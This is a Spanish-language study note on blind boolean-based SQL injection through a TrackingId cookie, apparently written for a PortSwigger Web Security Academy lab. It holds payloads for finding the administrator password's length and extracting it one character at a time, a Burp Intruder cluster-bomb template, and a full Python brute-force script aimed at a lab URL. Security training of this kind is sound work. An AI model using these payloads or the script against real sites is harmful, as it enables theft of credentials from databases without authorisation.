En las cookies también se prueba si son vulnerables a la inyección SQL de la misma manera que con las parámetros de las url 
Las inyecciones a ciegas son las que no nos permiten extraer información en forma de texto por lo que no pudiéramos extrae datos de las BD de la manera 

Otras referencias [[10.1 SQL injection with conditional responses Ejemplo Practico]]

```
'union select NULL,table_name FROM all_tables --
```

Por lo que se debe ir a ciegas probando para ir creando tanto los usuarios como el password

La técnica qui es  es valernos de alguna info que este en la pagina que nos indique que vamos por el buen camino y utilizar una técnica de seleccionar a prueba y error dependiendo de la respuesta
```
Aqui nos valemos de la propiedad de las BD del select que nos confirma V o F si se hac la comparacion 

select 'a'='a';
+---------+
| 'a'='a' |
+---------+
|       1 |
+---------+

select 'a'='b';
+---------+
| 'a'='b' |
+---------+
|       0 |
+---------+
```

Atendiendo a esto nos creamos la comparación necesaria para ir validando los valores
```
'and (select substring(password, 2,1) from users where username='administrador')='d'-- -
```

- **`substring(password, 2, 1)`**:
    
    - Toma la columna `password`
        
    - Empieza en la **posición 2** (segundo carácter)
        
    - Toma **1 carácter** de longitud
        
- **`where username='administrador'`**:
    
    - Filtra solo el usuario 'administrador'
        
- **`='d'`**:
    
    - Compara si ese carácter extraído es igual a 'd'

Mediante esta sentencia podemos mediane Burpsuit o un script ir probando caracter por caracter para descifrar la passwor del usuario es decir  iteramos por cada uno de los caracteres  substring(password, iterar, 1) y cada uno de estos lo comparariamos al final  ='iterar' iterendo el valor

En burpsuit con un Cluster bomb attack en el  iterator pudieramos hhacer una prueba multiple de conviaciones  
Primero verificariamos el la cantidad de caracteres que existen en la pass de la siguiente manera
```
'and (select 'a' from users where username='administrator' and length(password)>10)='a'-- -
'and (select 'a' from users where username='administrator' and length(password)>23)='a'-- -
'and (select 'a' from users where username='administrator' and length(password)=20)='a'-- -
 
```

Iriamos probando hasta dar con la cantidad exacta de caracteres para luego en el Intruder saber cuantos probaríamos
```
'and (select substring(password, $1$,1) from users where username='administrator')='$a$'-- -
```
Con el Cluster bomb attack estos 2 parametros se probarian todas las combinaciones

T ambien pudiéramos crearnos un scrip con python para esta tarea

```
from pwn import *

from termcolor import colored

import requests

import sys

import signal

import string

import time

  

def def_handler(sig, frame):

print(colored(f"\n[!] Saliendo...\n", 'red'))

p1.failure("Ataque de fuerza bruta detenido")

sys.exit(1)

  

# Ctrl+C

signal.signal(signal.SIGINT, def_handler)

  

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLI")

def makeSQL():

password = ""

p1.status("Iniciando ataque de fuerza bruta")

time.sleep(2)

p2 = log.progress("Password")

for position in range(1, 21):

for character in characters:

cookies = {

'TrackingId': f"CtFaF02n79AVORke' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",

'session': "qNkwWgEH4xK1io8l3hfZ99AEDACfOWdW"

}

  

p1.status(cookies['TrackingId'])

r = requests.get("https://0ae2008704014c6381d47fbd00e700b9.web-security-academy.net/", cookies=cookies)

if 'Welcome back' in r.text:

password += character

p2.status(password)

#print(colored(f"\n[*] Posición {position}: {character}", 'green'))

#print(colored(f"[*] Password parcial: {password}", 'blue'))

break

  

print(colored(f"\n[+] Password completo: {password}", 'green', attrs=['bold']))

  

if __name__ == '__main__':

makeSQL()
```